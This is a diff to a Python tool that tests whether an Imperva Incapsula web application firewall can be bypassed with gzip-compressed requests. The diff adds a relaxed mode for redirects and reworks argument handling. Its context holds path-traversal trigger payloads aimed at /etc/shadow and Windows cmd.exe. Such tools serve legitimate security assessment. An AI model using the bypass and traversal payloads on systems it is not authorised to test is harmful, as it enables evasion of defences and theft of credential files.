@@ -24,6 +24,12 @@ Check to see if the WAF is vulnerable to the gzip bypass:
 	[+] Attempting gzip bypass for Windows trigger...
 	[+] Vulnerable! HTTP response code: 200
 
+If you get this error:
+	$ ./imperva_gzip.py https://www.vulnerable.com/search
+	[+] Can we make POST requests to https://www.vulnerable.com/search?
+	[!] Can't POST to https://www.vulnerable.com/search. Try -r if 30x redirects are allowed. HTTP response code: 302
+
+then try passing -r on the command line to enable relaxed mode.
 
 You can script this tool and check the exit code in the caller:
 	0: Returned after getting WAF type.
@@ -56,6 +62,10 @@ import sys
 import requests
 from time import sleep
 
+# By default HTTP POST requests must elicit an HTTP 200 response.
+# Pass -r on the command line to enable relaxed mode, where
+# HTTP 2xx and 3xx are acceptable responses to a POST request.
+relaxedMode = False 
 payloadBaseline = {'foo': 'bar'}
 payloadUnixTrigger  = {'foo': 'bar', 'test': '../../../../../../../etc/shadow'}
 payloadWindowsTrigger  = {'foo': 'bar', 'test': '../../../../../Windows/System32/cmd.exe'}
@@ -65,6 +75,7 @@ class ImpervaBypass:
 		requests.packages.urllib3.disable_warnings() # turn off verbose SSL warnings
 		self.URL = URL
 		self.WAFType = ''
+		self.relaxedMode = False
 
 	def make_request(self, data, headers={}):
 		try:
@@ -132,11 +143,12 @@ class ImpervaBypass:
 	# Returns array (successFail, httpResponseStatusCode)
 	# success = false if there was an HTTP error (4xx, 5xx, etc) 
 	# success = true if there was a 2xx, 3xx, etc
-	# TODO: check for logic bugs handling redirects
 	def baseline_request(self):
 		try:
 			r = self.make_request(payloadBaseline)
 			r.raise_for_status()
+			if self.relaxedMode == False and r.status_code != 200:
+				return (False, r.status_code)
 			return (True, r.status_code)
 		except requests.exceptions.HTTPError:
 			return (False, r.status_code)
@@ -157,26 +169,26 @@ if len(sys.argv) == 3 and sys.argv[1] == '-t':
 	print(ImpervaBypass(sys.argv[2]).get_WAF_type())
 	exit(0)
 
-#
-# On with the show!
-#
-if len(sys.argv) != 2:
-	print("%s [-t] http(s)://www.example.com/" % sys.argv[0])
+if len(sys.argv) == 3 and sys.argv[1] == '-r':
+	imp = ImpervaBypass(sys.argv[2])
+	imp.relaxedMode = True
+elif len(sys.argv) != 2:
+	print("%s [[-t] | [-r]] http(s)://www.example.com/" % sys.argv[0])
 	exit(1)
-
-imp = ImpervaBypass(sys.argv[1])
+else:
+	imp = ImpervaBypass(sys.argv[1])
 
 # Verify we can make POST requests. No POST, no worky.
 print("[+] Can we make POST requests to %s?" % imp.URL)
 (success, status) = imp.baseline_request()
-if success == False || status != 200:
-	print("[!] Can't POST to %s. HTTP response code: %d" % (imp.URL, status))
+if success == False:
+	print("[!] Can't POST. Expected HTTP 200 but received HTTP %d. Use -r to allow HTTP 2xx and 3xx." % status)
 	exit(5)
 
 # Get the WAF type and abort if it's not Imperva.
-print("[+] Checking for Imperva WAF...")
+print("[+] Got HTTP %d response to POST. Checking for Imperva WAF..." % status)
 if imp.get_WAF_type() == 'None':
-	print("[!] It looks like there is no WAF protecting %s" % imp.URL)
+	print("[!] It looks like there is no WAF protecting this URL")
 	exit(3)
 elif imp.get_WAF_type() != 'Imperva Incapsula':
 	print("[!] Imperva wasn't detected. WAF type: %s" % imp.get_WAF_type())
